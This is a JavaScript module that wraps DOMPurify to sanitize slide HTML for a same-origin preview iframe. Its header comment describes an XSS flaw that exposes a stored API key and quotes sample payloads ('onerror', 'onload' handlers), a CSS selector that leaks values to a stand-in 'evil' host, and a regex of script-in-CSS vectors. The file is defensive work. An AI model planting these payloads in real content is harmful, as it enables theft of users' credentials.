// Sanitize engine-rendered slide HTML before it enters a same-origin preview
// frame. The XSS precondition behind #616 (threat model §5.1 T-CONTENT): the
// engine renders markdown with `html: true` and NO downstream sanitizer, and
// every docs-site preview writes that HTML into a `srcdoc` iframe that has NO
// `sandbox` attribute — so the frame inherits the app origin and can read
// `parent.localStorage` (the OpenRouter key, `lattice-db-or-key`). A shared or
// AI-generated deck / component skeleton carrying `<img src=x onerror=…>` or
// `<svg onload=…>` therefore executes in the app origin on preview and steals
// the key, with zero transformer involved.
//
// This is the single upstream guard the §8 remediation calls for. Sandboxing
// the frame would break the DELIBERATE same-origin runtime-`<script>` injection
// every preview relies on; sanitizing the CONTENT instead closes the hole on
// every path at once and leaves the (separately-appended) runtime/Mermaid/FIT
// scripts untouched, because they are concatenated into the srcdoc AFTER this
// HTML, not part of it.
//
// REUSE, DON'T REINVENT (HARD RULE #15): a hand-rolled HTML sanitizer is the
// classic mutation-XSS footgun, so this wraps DOMPurify (the vetted standard)
// rather than re-deriving an allowlist. We keep DOMPurify's default profile
// (HTML + SVG + MathML) because the engine legitimately emits inline `<svg>`
// for charts (funnel/journey/map) and MathML for KaTeX, and we additionally
// FORBID the tags a slide never legitimately carries (`<script>`, `<style>`,
// `<iframe>`, `<object>`, `<embed>`, `<form>`, `<input>`, `<base>`, `<link>`,
// `<meta>` — CSS arrives via the frame's own `<style>`, not the content). The
// default already strips `on*` handlers, `javascript:`/`vbscript:`/`data:html`
// URLs, and `<foreignObject>` (an SVG mXSS vector).
//
// Inline `style` is KEPT — the engine emits `style="background-image:url(…)"`
// (`lib/core/bg-image.js`) and `style="--logo-mask:url(…)"`
// (`lib/transformers/logo-marks.js`), and a static `url()` is a resource load
// (same trust as an `<img src>`, which we also keep), never script execution in
// the Chromium preview. We only strip a style value carrying a LEGACY
// script-in-CSS vector (`expression()`, `-moz-binding`, `behavior:`,
// `javascript:`/`vbscript:`) — none of which the engine ever emits, so the
// strip is invisible to real decks. (The attacker-authored COMPONENT stylesheet
// channel — where `[value^="a"]{background:url(//evil/a)}` selector leaks live —
// is closed separately at the gate, `lib/layout/gate.js` `findCssExfil`.)
//
// Plain ESM `.js` (not `.ts`) on purpose: the multi-slide builder (deck-preview)
// is unit-tested directly under the root Node runner, which has no Vite to strip
// types or resolve extensionless paths — so this module and its imports stay
// Node-loadable.

import DOMPurify from 'dompurify';

// Tags a rendered slide never legitimately carries. CSS comes from the frame's
// own `<style>` (built by the srcdoc builder), so a `<style>`/`<link>` in the
// CONTENT is only ever an exfil/override vector.
const FORBID_TAGS = ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'base', 'link', 'meta'];
const FORBID_ATTR = ['srcdoc'];

// Legacy script-in-inline-style vectors. url() is deliberately NOT here.
const STYLE_SCRIPT_RE = /expression\s*\(|(?:javascript|vbscript)\s*:|-moz-binding|behavior\s*:/i;

/** @type {ReturnType<typeof DOMPurify> | null} */
let purifier = null;

// Returns the window-bound purifier, or null when there is no DOM. The
// untrusted-HTML-meets-DOM event this module guards (the same-origin srcdoc
// frame reading localStorage) can ONLY occur in a browser, which always has
// `window`; a window-less context — a Node unit test of a builder's frame
// assembly, SSR — has no iframe, no localStorage, no DOM, hence no XSS surface
// to defend. So there we return the input untouched (see sanitizeSlideHtml): a
// no-op where there is provably no surface, NOT a fail-open into a live one.
function getPurifier() {
	if (purifier) return purifier;
	const win = typeof window !== 'undefined' ? window : undefined;
	if (!win) return null;
	const dp = DOMPurify(win);
	dp.addHook('uponSanitizeAttribute', (_node, data) => {
		if (data.attrName === 'style' && STYLE_SCRIPT_RE.test(data.attrValue)) data.keepAttr = false;
	});
	purifier = dp;
	return dp;
}

/**
 * Strip script-bearing constructs from engine-rendered slide HTML, preserving
 * everything a slide legitimately contains (chart SVG, MathML, tables, `<del>`/
 * `<ins>`/`<sup>`, `<img>`, inline `style` custom properties + `url()`). Call at
 * EVERY preview boundary before the HTML reaches a `srcdoc`/`innerHTML`. In a
 * window-less context (Node test / SSR — no XSS surface) it returns the input
 * unchanged; the browser preview, where the surface lives, always sanitizes.
 *
 * @param {string} html
 * @returns {string}
 */
export function sanitizeSlideHtml(html) {
	if (!html) return html;
	const dp = getPurifier();
	return dp ? dp.sanitize(String(html), { FORBID_TAGS, FORBID_ATTR }) : html;
}
